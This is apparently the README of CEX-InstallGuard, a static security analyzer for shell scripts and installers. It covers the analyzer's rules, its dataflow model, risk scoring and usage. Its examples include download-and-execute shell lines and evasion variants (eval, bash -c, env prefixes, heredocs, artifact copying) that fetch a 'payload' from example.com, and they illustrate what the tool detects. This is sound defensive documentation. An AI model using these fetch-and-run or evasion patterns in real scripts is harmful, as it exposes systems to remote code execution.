<div align="center">

# CEX-InstallGuard

### Static Shell & Installer Security Analysis

**Inspect first. Execute later.**

<br/>

[![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Version](https://img.shields.io/badge/Version-v13.0.0-6c5ce7?style=flat-square&logo=github)](https://github.com/cyberempirex/CEX-InstallGuard)
[![Security Rules](https://img.shields.io/badge/Security_Rules-52-e74c3c?style=flat-square&logo=shield&logoColor=white)](docs/rules.md)
[![Tests](https://img.shields.io/badge/Tests-205-2ecc71?style=flat-square&logo=pytest&logoColor=white)](tests/)
[![License](https://img.shields.io/badge/License-MIT-2ecc71?style=flat-square&logo=opensourceinitiative&logoColor=white)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Termux-0984e3?style=flat-square&logo=linux&logoColor=white)](docs/termux.md)
[![SARIF](https://img.shields.io/badge/SARIF-2.1.0-3498db?style=flat-square)](docs/reports.md)
[![CEX](https://img.shields.io/badge/CyberEmpireX-CEX-1a1a2e?style=flat-square&logo=github&logoColor=white)](https://github.com/cyberempirex)

<br/>

**Parse · Trace · Detect · Report**

<br/>

> 🛡️ Static security analysis for shell scripts and installers — without executing the target.

</div>

---

## What Is CEX-InstallGuard?

CEX-InstallGuard is a static security analyzer for shell scripts, installers, bootstrap scripts, and shell-based automation.

It analyzes scripts **without executing the target**.

Instead of treating a shell script as plain text, CEX-InstallGuard parses it into a structured representation containing commands, arguments, pipelines, redirections, assignments, substitutions, heredocs, subshells, and other shell constructs.

A dataflow-aware rule engine then analyzes how commands and potentially dangerous artifacts relate to one another.

For example:

```text
Remote URL
    │
    ▼
 Download
    │
    ▼
Staged Artifact
    │
    ├──────────────► Permission Change
    │
    ▼
Execution Sink
    │
    ▼
Security Finding
```

This allows CEX-InstallGuard to recognize relationships that may be separated by many lines of shell code.

> **The goal is not simply to find suspicious strings. It is to understand security-relevant behavior.**

---

## Why Shell & Installer Security?

Shell installers routinely perform operations with significant system impact:

- Downloading remote content
- Executing downloaded files
- Changing file permissions
- Modifying system configuration
- Installing binaries
- Writing startup files
- Invoking interpreters
- Handling environment variables
- Running commands with elevated privileges

A malicious or compromised installer can therefore become a direct execution path onto a system.

CEX-InstallGuard provides a static inspection layer before that execution takes place.

---

## Core Capabilities

| Capability | Description |
|---|---|
| **Structured Shell Parsing** | Parses quoting, escapes, expansions, pipelines, sequences, redirections, heredocs, subshells and assignment prefixes |
| **AST Analysis** | Evaluates shell behavior through structured commands rather than raw text alone |
| **Dataflow Tracking** | Tracks remote variables, downloaded artifacts and staged payloads across a file |
| **Artifact Lifecycle Analysis** | Distinguishes downloading, permission changes, interpretation and actual execution |
| **52 Security Rules** | Detects execution, network, permissions, obfuscation, persistence, destructive actions and other security indicators |
| **Execution-Evasion Detection** | Handles indirect commands, `env`, static `eval`, `bash -c`, heredocs and artifact movement |
| **Baseline System** | Position-stable fingerprints for suppressing accepted findings |
| **Ignore Paths** | `.installguardignore` and `--exclude` support |
| **Risk Scoring** | Confidence-weighted 0–100 risk model |
| **JSON Reports** | Machine-readable structured output |
| **SARIF 2.1.0** | Security-tooling and GitHub Code Scanning integration |
| **HTML Reports** | Standalone dashboard with severity filtering |
| **Interactive Console** | Command center, finding inspector, rule explorer and security profile |
| **CI Support** | Deterministic analysis and meaningful exit codes |
| **No Target Execution** | The target shell script is not executed during static analysis |

---

## Architecture


flowchart TD
    A["Shell / Installer Script"] --> B["Shell Parser"]
    B --> C["Structured Command Tree"]
    C --> D["AST Analyzer"]

    D --> E["Command Analysis"]
    D --> F["Dataflow Tracking"]
    D --> G["Artifact Lifecycle"]

    E --> H["Security Rule Engine"]
    F --> H
    G --> H

    H --> I["Finding Deduplication"]
    I --> J["Confidence Analysis"]
    J --> K["Risk Scoring"]

    K --> L["Terminal"]
    K --> M["JSON Report"]
    K --> N["SARIF 2.1.0"]
    K --> O["HTML Dashboard"]

    G --> P["Downloaded"]
    P --> Q["Made Executable"]
    Q --> R["Interpreted"]
    R --> S["Executed"]

---

## v13 Semantic Artifact Model

One of the important changes in v13 is the separation of artifact lifecycle states.

A downloaded file being made executable is not the same event as that file actually being executed.

```text
        DOWNLOAD
           │
           ▼
    ┌──────────────┐
    │   Artifact   │
    └──────┬───────┘
           │
           ├──────────────► MAKE EXECUTABLE
           │                       │
           │                       ▼
           │                      IG049
           │
           ├──────────────► INTERPRET
           │                       │
           │                       ▼
           │                      IG050
           │
           └──────────────► EXECUTE
                                   │
                                   ▼
                                  IG048
```

For example:

```bash
curl -o /tmp/tool http://example.com/tool
chmod +x /tmp/tool
/tmp/tool
```

CEX-InstallGuard distinguishes:

```text
Line 1 → Retrieval
Line 2 → Permission change
Line 3 → Actual execution
```

This prevents `chmod +x` from being incorrectly interpreted as proof that the artifact was executed.

---

## Security Rules

CEX-InstallGuard currently contains **52 registered security rules**.

Rules operate across structured shell information, content analysis, dataflow, and artifact state.

### Rule Categories

| Category | Security Focus |
|---|---|
| **Execution** | Shell execution, interpreters, downloaded artifact execution |
| **Network** | Remote retrieval, insecure transport, suspicious network operations |
| **Permissions** | Executable permission changes and dangerous permission operations |
| **Obfuscation** | Encoded payloads and suspicious transformations |
| **Persistence** | Startup scripts and persistent configuration changes |
| **Secrets** | Potential credential and secret exposure |
| **Filesystem** | Suspicious file creation, movement, modification and deletion |
| **Privilege** | Elevated or privileged operations |
| **Shell Abuse** | Suspicious shell constructs and execution chains |

Explore the complete rule registry:

```bash
python -m cex_installguard --rules
```

Full generated catalogue:

```text
docs/rules.md
```

---

## Execution-Evasion Coverage

Shell behavior can be represented indirectly.

CEX-InstallGuard specifically analyzes several common forms of execution indirection.

### Indirect Commands

```bash
C=curl
$C https://example.com/payload
```

### Environment Prefixes

```bash
env URL=https://example.com/payload curl "$URL"
```

### Static `eval`

```bash
eval 'curl https://example.com/payload'
```

### `bash -c`

```bash
bash -c 'curl https://example.com/payload'
```

### Heredoc-Generated Scripts

```bash
cat > /tmp/install.sh <<'EOF'
curl https://example.com/payload
EOF
```

### Artifact Movement

```bash
curl -o /tmp/a https://example.com/a
cp /tmp/a /tmp/b
/tmp/b
```

These cases are analyzed recursively where possible, with shared file state used to preserve relevant relationships.

---

## False-Positive Controls

Security analysis needs precision as well as coverage.

CEX-InstallGuard includes regression coverage for cases such as:

- Quoted variables in `rm`
- `PATH=` append operations
- Static `eval` strings that do not represent dynamic execution
- Literal secrets that are not actually exposed
- Permission changes that do not constitute execution
- Non-executable file names resembling commands

The goal is to distinguish suspicious **behavior** from suspicious-looking text.

---

## Risk Scoring

Every scan can produce a risk score from **0 to 100**.

The scoring model combines:

- Finding severity
- Detection confidence
- Severity-specific weights
- Aggregation by severity
- Logarithmic damping
- Final exponential compression

Current severity weights:

| Severity | Weight |
|---|---:|
| Critical | 40 |
| High | 25 |
| Medium | 10 |
| Low | 3 |

### Verdict Ladder

| Verdict | Condition |
|---|---|
| **BLOCK** | Any critical finding |
| **REVIEW** | Any high finding or score ≥ 60 |
| **CAUTION** | Any medium finding or score ≥ 30 |
| **LOW-SIGNAL** | Lower-risk findings |
| **NO-FINDINGS** | No qualifying findings |

A `NO-FINDINGS` result does **not** mean that the target is guaranteed safe.

Static analysis has inherent limitations.

---

## Installation

### Requirements

- Python 3.9+
- Standard Python library for the core engine
- Optional development dependencies for testing

No external security scanner is required for the core analysis engine.

### From Source

```bash
git clone https://github.com/cyberempirex/CEX-InstallGuard.git
cd CEX-InstallGuard
python -m pip install -e .
```

Verify the installation:

```bash
cex-installguard --help
```

---

## Termux

CEX-InstallGuard is designed to work directly in Termux.

```bash
termux-setup-storage
cd ~/storage/downloads/CEX-InstallGuard
python -m pip install -e .
```

Launch the interactive console:

```bash
cex-installguard
```

Or scan directly:

```bash
cex-installguard examples/dangerous.sh
```

---

## Quick Start

### Scan One Script

```bash
cex-installguard script.sh
```

### Scan a Project

```bash
cex-installguard ./my-project --recursive
```

### Parallel Scanning

```bash
cex-installguard ./my-project --recursive --workers 8
```

### Minimum Severity

```bash
cex-installguard script.sh --min-severity high
```

### Exclude Paths

```bash
cex-installguard script.sh \
  --exclude 'vendor/*' \
  --exclude 'test-data/*'
```

### Quiet Mode

```bash
cex-installguard script.sh --quiet
```

---

## Exit Codes

The default failure threshold is `high`.

| Code | Meaning |
|---:|---|
| `0` | No finding at or above the failure threshold and no blocking scan error |
| `1` | Scan/input error without qualifying findings |
| `2` | At least one finding at or above the threshold |

This makes the analyzer suitable for CI pipelines.

---

## Reports

### JSON

```bash
python -m cex_installguard script.sh --json report.json
```

### SARIF 2.1.0

```bash
python -m cex_installguard script.sh --sarif report.sarif.json
```

The SARIF output includes:

- Per-finding artifact locations
- Rule metadata
- Full rule registry
- Checkout-relative artifact URIs

This makes the output suitable for security tooling and GitHub Code Scanning workflows.

### HTML

```bash
python -m cex_installguard script.sh --html report.html
```

The HTML report is standalone and provides severity filtering through a security-focused dashboard.

---

## Baselines

Save the current findings:

```bash
python -m cex_installguard script.sh \
  --save-baseline baseline.json
```

Analyze against a baseline:

```bash
python -m cex_installguard script.sh \
  --baseline baseline.json
```

Suppress a specific rule:

```bash
python -m cex_installguard script.sh \
  --suppress IG012
```

### Position-Stable Fingerprints

Baseline fingerprints are designed to survive normal source changes.

Inserting lines or changing whitespace should not unnecessarily resurrect a previously suppressed finding.

Earlier baseline formats remain supported.

---

## Configuration

Project configuration can be provided through:

```text
.cex-installguard.json
```

An example configuration is included:

```text
.cex-installguard.json.example
```

Create a local configuration:

```bash
cp .cex-installguard.json.example .cex-installguard.json
```

Ignore paths can be defined using:

```text
.installguardignore
```

Additional path exclusions can be supplied through:

```bash
--exclude
```

### Color Controls

CEX-InstallGuard supports:

```text
--color=WHEN
NO_COLOR
CLICOLOR_FORCE
```

Interactive animations automatically remain suitable for CI and piped output.

---

## Interactive Console

Running CEX-InstallGuard without a target launches the interactive console:

```bash
cex-installguard
```

The console provides:

```text
┌──────────────────────────────────────┐
│        CEX-InstallGuard Console      │
├──────────────────────────────────────┤
│  Command Center                      │
│  Finding Inspector                   │
│  Rule Explorer                       │
│  Security Profile                    │
│  Scan Interface                      │
└──────────────────────────────────────┘
```

The interface is optimized for terminal environments including Termux.

---

## CLI Reference

```text
cex-installguard [PATH] [OPTIONS]
```

| Option | Purpose |
|---|---|
| `PATH` | Script or project to analyze |
| `--recursive` | Scan directories recursively |
| `--workers N` | Configure parallel workers |
| `--min-severity LEVEL` | Minimum displayed severity |
| `--fail-on LEVEL` | Configure CI failure threshold |
| `--exclude GLOB` | Exclude matching paths |
| `--quiet` | Reduce terminal output |
| `--json FILE` | Generate JSON report |
| `--sarif FILE` | Generate SARIF report |
| `--html FILE` | Generate HTML report |
| `--baseline FILE` | Load baseline |
| `--save-baseline FILE` | Save baseline |
| `--suppress RULE` | Suppress a rule |
| `--rules` | Explore security rules |
| `--help` | Display help |

Complete CLI information:

```bash
cex-installguard --help
```

---

## Project Structure

```text
CEX-InstallGuard/
│
├── cex_installguard/
│   ├── analyzer.py
│   ├── api.py
│   ├── baseline.py
│   ├── cli.py
│   ├── config.py
│   ├── engine.py
│   ├── interactive.py
│   ├── models.py
│   ├── parser.py
│   ├── policy.py
│   ├── reporter.py
│   ├── rules.py
│   ├── scanner.py
│   ├── scoring.py
│   ├── shellparser.py
│   ├── suppressions.py
│   ├── terminal.py
│   ├── ui.py
│   └── version.py
│
├── tests/
│   ├── test_adversarial.py
│   ├── test_analyzer.py
│   ├── test_baseline.py
│   ├── test_cli.py
│   ├── test_engine.py
│   ├── test_layers.py
│   ├── test_parser.py
│   ├── test_reports.py
│   ├── test_scanner.py
│   ├── test_ui.py
│   ├── test_v12_2.py
│   └── test_v13.py
│
├── docs/
│   ├── api.md
│   ├── architecture.md
│   ├── configuration.md
│   ├── development.md
│   ├── reports.md
│   ├── rules.md
│   ├── security-model.md
│   └── termux.md
│
├── examples/
│   ├── dangerous.sh
│   ├── installer.sh
│   ├── obfuscated.sh
│   ├── safe.sh
│   └── suspicious.sh
│
├── tools/
│   └── generate_docs.py
│
├── installguard.py
├── pyproject.toml
├── requirements-dev.txt
├── SECURITY.md
├── LICENSE
└── README.md
```

---

## Testing

CEX-InstallGuard v13 includes **205 tests** spanning:

- Parser behavior
- AST analysis
- Dataflow tracking
- Artifact lifecycle semantics
- Security rules
- Adversarial inputs
- Regression cases
- Baselines
- Scanner behavior
- CLI behavior
- Configuration
- Reports
- Interactive UI

Run the complete test suite:

```bash
pytest
```

Install development dependencies:

```bash
python -m pip install -r requirements-dev.txt
```

---

## Documentation

| Document | Description |
|---|---|
| [Architecture](docs/architecture.md) | Analysis architecture and design |
| [Rules](docs/rules.md) | Generated security rule catalogue |
| [Security Model](docs/security-model.md) | Scope, assumptions and limitations |
| [Configuration](docs/configuration.md) | Project configuration |
| [Reports](docs/reports.md) | Report formats and integration |
| [API](docs/api.md) | Python API |
| [Termux](docs/termux.md) | Termux usage |
| [Development](docs/development.md) | Development workflow |

---

## Security Model & Limitations

CEX-InstallGuard is a **static analyzer**, not a sandbox or dynamic malware-analysis environment.

It does not execute the target script during analysis.

Static analysis can still miss behavior involving:

- Highly dynamic runtime construction
- Environment-specific behavior
- External state unavailable during analysis
- Novel shell techniques outside the current rule model
- Vulnerabilities unrelated to the supported security rules

A clean scan should therefore be interpreted as:

> **No qualifying behavior was detected by the current analysis model.**

It should not be interpreted as a guarantee of safety.

See [SECURITY.md](SECURITY.md) and [docs/security-model.md](docs/security-model.md).

---

## v13.0.0 at a Glance

| Component | Current |
|---|---|
| **Security Rules** | 52 |
| **Tests** | 205 |
| **Reports** | JSON · SARIF 2.1.0 · HTML |
| **Analysis** | Structured parsing + AST + dataflow |
| **Artifact Model** | Download → permission → interpretation → execution |
| **Interface** | CLI + Interactive Console + Python API |
| **Configuration** | `.cex-installguard.json` |
| **Ignore System** | `.installguardignore` + `--exclude` |
| **Platforms** | Linux · macOS · Termux |
| **Target Execution** | Never performed by the analyzer |

---

## CyberEmpireX

CEX-InstallGuard is developed by **CyberEmpireX (CEX)** as part of its security tooling ecosystem.

[![CyberEmpireX](https://img.shields.io/badge/CyberEmpireX-CEX-1a1a2e?style=flat-square&logo=github&logoColor=white)](https://github.com/cyberempirex)

---

<div align="center">

**CEX-InstallGuard**

*Parse · Trace · Detect · Report*

**v13.0.0 · MIT License · CyberEmpireX**

</div>
